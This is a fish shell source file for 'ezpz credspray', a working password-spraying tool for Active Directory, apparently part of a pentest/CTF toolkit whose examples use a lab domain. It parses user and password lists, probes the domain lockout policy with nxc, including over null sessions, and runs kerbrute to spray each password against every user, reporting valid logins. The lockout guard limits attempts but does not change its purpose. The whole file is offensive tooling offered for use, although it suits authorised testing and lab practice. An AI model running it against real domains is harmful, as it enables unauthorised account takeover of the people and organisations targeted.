# Creds-aware input detection: -u and -p accept a plain list or a user:pass
# file without any extra flag. A file counts as creds when every meaningful
# line carries a colon.
function __ezpz_credspray_is_creds_file --argument-names file
    set -l lines 0
    while read -l line
        set line (string trim -- $line)
        test -z "$line"; and continue
        string match -q '#*' -- $line; and continue
        string match -q '*:*' -- $line; or return 1
        set lines (math $lines + 1)
    end < $file
    test $lines -gt 0
end

# Strip DOMAIN\ / DOMAIN/ prefixes and @domain suffixes. kerbrute wants the
# bare username.
function __ezpz_credspray_bare_user --argument-names raw
    set -l user (string replace -r '^[^\\/]+[\\/]' '' -- $raw)
    printf '%s\n' (string replace -r '@.*$' '' -- $user)
end

function __ezpz_credspray_is_hash --argument-names value
    string match -qr '^[a-fA-F0-9]{32}$' -- $value
end

# kerbrute logs "2026/11/12 09:27:04 >  [+] ..." with color codes, and fish
# prepends OSC palette sequences when the capture file is replayed. Strip all
# of it so the output stays readable.
function __ezpz_credspray_logfmt
    sed -E "s/\x1B\][^\a\x1B]*(\a|\x1B.)//g; s/\x1B\[[0-9;?]*[A-Za-z]//g; s/^[0-9]{4}\/[0-9]{2}\/[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2} > +//"
end

# Pull the lockout threshold out of `nxc --pass-pol` output.
function __ezpz_credspray_lockout_threshold
    set -l line (printf '%s\n' $argv | grep -aoE 'Account Lockout Threshold: [A-Za-z0-9]+' | head -1)
    set -l value (string replace -r '^.*: ' '' -- "$line")
    string match -qr '^[0-9]+$' -- "$value"; and printf '%s\n' $value
end

function _ezpz_credspray
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    ezpz_banner credspray

    set usage "
Usage: ezpz credspray -t <target> -d <domain> [-u <user|file>] [-p <password|file>] [-f <creds>]

  Password spraying via Kerberos (kerbrute) against Active Directory.

  Required:
    -t, --target      Domain Controller IP or hostname
    -d, --domain      Full AD domain (e.g. north.sevenkingdoms.local)

  Credential sources (need at least one user source and one password source):
    -u, --user        A username, a file with one username per line, or a
                      user:pass file (only the username part is used).
    -p, --password    A password, a file with one password per line, or a
                      user:pass file (only the password part is used).
    -f, --file        Hail mary: a user:pass file. Usernames and passwords are
                      split apart and every password is sprayed against every
                      user.

  Input handling:
    Lines starting with # are ignored. DOMAIN\\user and user@domain are
    normalized to the bare username. NT hashes (32 hex chars) are skipped; use
    testcreds -H for pass-the-hash. Accounts that never authenticate (krbtgt,
    machine accounts ending in \$, built-in placeholders) are dropped: --safe
    would read their disabled state as a lockout and abort the spray.

  Lockout protection:
    kerbrute always runs with --safe, so the spray aborts on the first locked
    account. Before spraying, the domain password policy is read with nxc and
    the password list is trimmed to one attempt below the lockout threshold.
    The policy probe uses the first line of creds.txt (the ctf.fish standard),
    falling back to a null session, and is skipped when neither works.

    --force           Spray the whole list, ignoring the policy guard
    --unsafe          Do not pass --safe to kerbrute

Examples:
  # One password against a user list
  ezpz credspray -t 10.10.0.11 -d north.sevenkingdoms.local \\
      -u users.txt -p 'Winter2024'

  # A file with candidate passwords
  ezpz credspray -t 10.10.0.11 -d north.sevenkingdoms.local \\
      -u users.txt -p passwords.txt

  # Hail mary: users and passwords come from creds.txt
  ezpz credspray -t 10.10.0.11 -d north.sevenkingdoms.local -f creds.txt
"

    argparse 't/target=' 'u/user=' 'p/password=' 'f/file=' 'd/domain=' \
        'F/force' 'unsafe' 'h/help' -- $argv
    or begin
        ezpz_error "Failed to parse arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 0
    end

    if not set -q _flag_target
        ezpz_error "Missing target."
        echo $usage
        return 1
    end

    if not set -q _flag_domain
        ezpz_error "Missing domain."
        echo $usage
        return 1
    end

    if not command -v kerbrute >/dev/null 2>&1
        ezpz_error "Required tool not found: kerbrute"
        return 1
    end

    set -l users
    set -l passwords
    set -l hashes 0
    # Real path to show in the repeatable command, when the caller gave one.
    set -l users_arg ""

    # -u: literal username, username list, or user:pass file.
    if set -q _flag_user
        if test -f $_flag_user
            if __ezpz_credspray_is_creds_file $_flag_user
                while read -l line
                    set line (string trim -- $line)
                    test -z "$line"; and continue
                    string match -q '#*' -- $line; and continue
                    set -l user (__ezpz_credspray_bare_user (string split -m1 : $line)[1])
                    test -n "$user"; or continue
                    contains -- $user $users; or set -a users $user
                end < $_flag_user
            else
                set users_arg $_flag_user
                while read -l line
                    set line (string trim -- $line)
                    test -z "$line"; and continue
                    string match -q '#*' -- $line; and continue
                    set -l user (__ezpz_credspray_bare_user $line)
                    test -n "$user"; or continue
                    contains -- $user $users; or set -a users $user
                end < $_flag_user
            end
        else
            set -l user (__ezpz_credspray_bare_user $_flag_user)
            test -n "$user"; and set -a users $user
        end
    end

    # -p: literal password, password list, or user:pass file.
    if set -q _flag_password
        if test -f $_flag_password
            if __ezpz_credspray_is_creds_file $_flag_password
                while read -l line
                    set line (string trim -- $line)
                    test -z "$line"; and continue
                    string match -q '#*' -- $line; and continue
                    set -l pass (string split -m1 : $line)[2]
                    test -n "$pass"; or continue
                    if __ezpz_credspray_is_hash $pass
                        set hashes (math $hashes + 1)
                        continue
                    end
                    contains -- $pass $passwords; or set -a passwords $pass
                end < $_flag_password
            else
                while read -l line
                    set line (string trim -- $line)
                    test -z "$line"; and continue
                    string match -q '#*' -- $line; and continue
                    if __ezpz_credspray_is_hash $line
                        set hashes (math $hashes + 1)
                        continue
                    end
                    contains -- $line $passwords; or set -a passwords $line
                end < $_flag_password
            end
        else if test -n "$_flag_password"
            if __ezpz_credspray_is_hash $_flag_password
                set hashes (math $hashes + 1)
            else
                contains -- $_flag_password $passwords; or set -a passwords $_flag_password
            end
        end
    end

    # -f: hail mary, split users and passwords out of the same creds file.
    if set -q _flag_file
        if not test -f $_flag_file
            ezpz_error "File '$_flag_file' not found."
            return 1
        end

        while read -l line
            set line (string trim -- $line)
            test -z "$line"; and continue
            string match -q '#*' -- $line; and continue

            set -l parts (string split -m1 : $line)
            test (count $parts) -ge 2; or continue

            set -l user (__ezpz_credspray_bare_user $parts[1])
            set -l pass $parts[2]

            if test -n "$user"
                contains -- $user $users; or set -a users $user
            end

            test -n "$pass"; or continue
            if __ezpz_credspray_is_hash $pass
                set hashes (math $hashes + 1)
                continue
            end

            contains -- $pass $passwords; or set -a passwords $pass
        end < $_flag_file
    end

    # Accounts that can never authenticate. kerbrute --safe treats a disabled
    # account (KRB_ERR_CLIENT_REVOKED) as a lockout and aborts the whole spray,
    # so krbtgt or a machine account would kill every run.
    set -l sprayable
    set -l skipped_users 0
    for user in $users
        set -l lower (string lower -- $user)
        if test "$lower" = krbtgt
            set skipped_users (math $skipped_users + 1)
            continue
        end
        if string match -q '*$' -- $user
            set skipped_users (math $skipped_users + 1)
            continue
        end
        if contains -- $lower guest defaultaccount defaultuser wdagutilityaccount
            set skipped_users (math $skipped_users + 1)
            continue
        end
        set -a sprayable $user
    end
    set users $sprayable

    if test (count $users) -eq 0
        ezpz_error "No sprayable usernames found. Use -u or -f with a user:pass file."
        echo $usage
        return 1
    end

    if test $skipped_users -gt 0
        ezpz_warn "Skipped $skipped_users non-logon account(s) (krbtgt, machine, built-in)."
    end

    if test (count $passwords) -eq 0
        ezpz_error "No passwords found. Use -p or -f with a user:pass file."
        echo $usage
        return 1
    end

    if test $hashes -gt 0
        ezpz_warn "Skipped $hashes NT hash(es); kerbrute only sprays passwords."
    end

    # Lockout guard: read the domain password policy before spraying so a
    # password list larger than the threshold never hits the DC.
    set -l per_user (count $passwords)

    if set -q _flag_force
        ezpz_warn "Lockout guard bypassed with --force."
    else
        set -l policy_tmp (mktemp)
        set -l threshold ""

        # ctf.fish leaves the known credentials in creds.txt. A pair taken from
        # the spray list is a guess, so it is not used to read the policy.
        if test -f creds.txt
            while read -l line
                set line (string trim -- $line)
                test -z "$line"; and continue
                string match -q '#*' -- $line; and continue

                set -l parts (string split -m1 : $line)
                test (count $parts) -ge 2; or continue

                set -l puser (__ezpz_credspray_bare_user $parts[1])
                set -l ppass $parts[2]
                test -n "$puser"; and test -n "$ppass"; or continue
                __ezpz_credspray_is_hash $ppass; and continue

                ezpz_spin_capture $policy_tmp timeout 30 nxc smb $_flag_target \
                    -u "$_flag_domain\\$puser" -p "$ppass" --pass-pol
                set threshold (__ezpz_credspray_lockout_threshold (cat $policy_tmp))
                break
            end < creds.txt
        end

        if test -z "$threshold"
            # No known credential: try a null session, it costs no attempt.
            ezpz_spin_capture $policy_tmp timeout 30 nxc smb $_flag_target -u '' -p '' --pass-pol
            set threshold (__ezpz_credspray_lockout_threshold (cat $policy_tmp))
        end

        rm -f $policy_tmp

        if test -n "$threshold"
            if test $threshold -gt 0
                # One bad password below the threshold keeps every account
                # clear; the attempt that reaches the threshold locks it.
                set -l limit (math $threshold - 1)

                if test $limit -lt 1
                    ezpz_error "Lockout threshold is $threshold; a single wrong password locks every account."
                    ezpz_warn "Use --force to spray anyway."
                    return 1
                end

                if test $per_user -gt $limit
                    set -l dropped (math $per_user - $limit)
                    ezpz_warn "Lockout threshold $threshold: spraying the first $limit of $per_user passwords per user ($dropped dropped, --force to spray all)."
                    set passwords $passwords[1..$limit]
                else
                    ezpz_info "Lockout policy: threshold $threshold, $per_user attempt(s) per user."
                end
            end
        else
            ezpz_warn "Could not read the lockout threshold; --safe stays on."
        end
    end

    # kerbrute needs the users in a file. Keep the caller's path for the
    # printed command when it is actually the source of the users.
    set -l users_ref '<USERSFILE>'
    if test -n "$users_arg"; and not set -q _flag_file
        set users_ref $users_arg
    end

    set -l kb passwordspray --dc $_flag_target -d $_flag_domain
    if not set -q _flag_unsafe
        set -a kb --safe
    end

    set -l users_tmp (mktemp)
    set -l run_tmp (mktemp)
    trap "rm -f '$users_tmp' '$run_tmp'" EXIT TERM INT
    printf '%s\n' $users > $users_tmp

    ezpz_header "Spraying "(count $passwords)" passwords against "(count $users)" usernames"
    ezpz_cmd "kerbrute $kb $users_ref <PASSWORD>"

    set -l found 0
    set -l aborted false
    for password in $passwords
        ezpz_info "Password: $password"

        ezpz_spin_capture $run_tmp kerbrute $kb $users_tmp $password

        set -l hits (grep -aiE 'VALID LOGIN' $run_tmp | __ezpz_credspray_logfmt)
        if test (count $hits) -gt 0
            printf '%s\n' $hits
            set found (math $found + (count $hits))
        end

        # kerbrute --safe logs: [!] user@REALM:pass - USER LOCKED OUT and safe
        # mode on! Aborting... The prefix carries a timestamp, so cut at the
        # marker instead of anchoring to the start of the line.
        set -l locked (grep -aiE 'USER LOCKED OUT' $run_tmp | __ezpz_credspray_logfmt)
        if test (count $locked) -gt 0
            set -l account (printf '%s\n' $locked[1] | sed -E 's/^.*\[[!]\] +//; s/@.*//')
            ezpz_error "Lockout detected on $account (locked, disabled or expired). Spraying stopped."
            set aborted true
            break
        end

        if grep -aqiE 'NETWORK ERROR|WRONG REALM' $run_tmp
            grep -aiE '\[!\]' $run_tmp | __ezpz_credspray_logfmt
            ezpz_warn "Spraying stopped."
            set aborted true
            break
        end
    end

    rm -f $users_tmp $run_tmp

    if test $found -gt 0
        ezpz_success "Valid logins: $found"
        return 0
    end

    test $aborted = true; and return 1

    ezpz_warn "No valid logins found."
    return 1
end
